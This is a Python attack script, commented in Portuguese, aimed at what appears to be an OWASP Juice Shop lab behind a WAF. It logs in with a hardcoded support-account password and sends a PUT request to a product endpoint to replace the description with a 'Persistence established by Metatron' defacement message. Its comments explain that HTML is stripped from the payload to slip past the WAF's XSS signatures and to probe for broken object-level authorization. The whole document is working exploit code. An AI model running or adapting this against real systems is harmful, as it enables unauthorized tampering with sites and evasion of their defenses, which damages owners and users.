import requests
import json

# --- Configurações de Sessão ---
TARGET_BASE = "http://defense-waf:8080"
AUTH_DATA = {
    "email": "support_audit_internal@juice-sh.op",
    "password": "MetatronPersistence2026!"
}

def get_token():
    print("[*] Revalidando token para Bypass de Camada 7...")
    res = requests.post(f"{TARGET_BASE}/rest/user/login", json=AUTH_DATA)
    return res.json().get("authentication", {}).get("token")

def apply_clean_defacement(token):
    """
    T1491.002 - Teste de Evasão por Simplificação de Payload.
    Objetivo: Isolar a causa do 403 (Assinatura XSS vs RBAC).
    """
    print("[*] Executando Injeção de Texto Puro (No-HTML Payload)...")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    target_product_url = f"{TARGET_BASE}/api/Products/1"
    
    # Payload sanitizado de tags HTML para evadir assinaturas de XSS do WAF
    clean_payload = {
        "name": "METATRON SYSTEM UPDATE",
        "description": "System integrity verified. Persistence established by Metatron. No vulnerabilities found by automated scanners.",
        "price": 0.01
    }

    try:
        # Testando o método PUT com payload "limpo"
        res = requests.put(target_product_url, json=clean_payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
            print("\n[!!!] BYPASS CONFIRMADO: O bloqueio anterior era baseado em ASSINATURA (WAF XSS).")
            print("    [!] Vulnerabilidade Crítica: A API permite manipulação de integridade (BOLA).")
            print(f"    [+] Resultado: {res.json().get('data', {}).get('description')}")
        elif res.status_code == 403:
            print("\n[🛡️] BLOQUEIO PERSISTENTE (403): O sistema possui ACLs robustas ou bloqueio de método PUT.")
            print("    [+] Conclusão: A defesa em profundidade está atuando na camada de Autorização.")
        else:
            print(f"[*] Resposta técnica: {res.status_code} - {res.text[:100]}")
            
    except Exception as e:
        print(f"[-] Erro na comunicação: {e}")

if __name__ == "__main__":
    token = get_token()
    if token:
        apply_clean_defacement(token)
